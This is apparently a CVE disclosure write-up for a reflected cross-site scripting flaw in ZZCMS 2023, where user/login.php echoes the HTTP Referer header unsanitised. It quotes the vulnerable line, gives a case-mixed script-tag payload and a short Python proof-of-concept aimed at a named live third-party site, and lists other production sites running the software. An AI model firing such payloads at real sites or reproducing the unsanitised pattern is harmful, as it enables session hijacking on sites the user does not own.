# ZZCMS 2023 反射型XSS user/login.php

## CVE-ID

**CVE-2024-43009**

## Vulnerability type 

Cross Site Scripting (XSS)

## Vendor of the product(s) info

http://www.zzcms.net/about/download.html
## Affected product(s)/code base info

## Product	* Version	

ZZCMS
<=2023(latest)

## Optional

Has vendor confirmed or acknowledged the vulnerability? No

## Attack type 

Remote

Information Disclosure

## Affected component(s)

```
File: user/login.php
Line: 24
Vulnerable Code:
$strout = str_replace("{#fromurl}", @$_SERVER['HTTP_REFERER'], $strout);
```



## Attack vector(s)

```
Type: Reflected Cross-Site Scripting (XSS)
Exploit: An attacker can craft a malicious URL that includes a specially crafted Referer header. When a victim clicks on this URL, the malicious script embedded in the Referer header will be executed in the context of the victim's browser.
Example:
Referer: "/></td><ScRipt>alert(1)</ScRipt><td
```



## Suggested description of the vulnerability for use in the CVE

```
A reflected cross-site scripting (XSS) vulnerability exists in user/login.php at line 24. The application directly inserts the value of the HTTP_REFERER header into the HTML response without proper sanitization. An attacker can exploit this vulnerability by tricking a user into visiting a specially crafted URL, which includes a malicious Referer header. This can lead to the execution of arbitrary JavaScript code in the context of the victim's browser, potentially resulting in session hijacking, defacement, or other malicious activities.
```



## Discoverer(s)/Credits 

GKDf1sh



## Reference(s) 

```
https://demo.zzcms.com
https://www.88zsw.com
http://www.818yyzs.com
https://www.qibai.cc
http://www.weixumu.cn
http://www.eshouyao.com
http://www.66988.tv/
http://www.dl580.tv/
```



## Additional information

```python
You can use hackbar to add header Referer: "/></td><ScRipt>alert(1)</ScRipt><td ,or use python below

import requests

url = "https://www.88zsw.com/user/login.php"

headers = {
    "Referer": '"/></td><ScRipt>alert(1)</ScRipt><td'
}

response = requests.get(url, headers=headers)

print(response.text)

if "<ScRipt>alert(1)</ScRipt>" in response.text:
    print("XSS yes")
```

